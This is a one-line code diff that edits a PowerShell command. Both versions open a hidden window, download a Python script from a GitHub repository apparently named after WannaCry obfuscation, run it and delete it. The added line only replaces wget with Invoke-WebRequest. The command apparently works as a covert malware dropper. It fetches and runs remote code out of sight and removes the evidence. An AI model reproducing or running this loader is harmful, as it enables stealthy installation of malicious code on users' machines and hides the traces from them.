@@ -1,1 +1,1 @@
-powershell -windowstyle hidden{$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py';wget -Uri $url;python3 Oshawott.py;Remove-Item"Oshawott.py";}
+powershell -windowstyle hidden{$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py';Invoke-WebRequest -Uri $url - UseBasicParsing;python3 Oshawott.py;Remove-Item"Oshawott.py";}
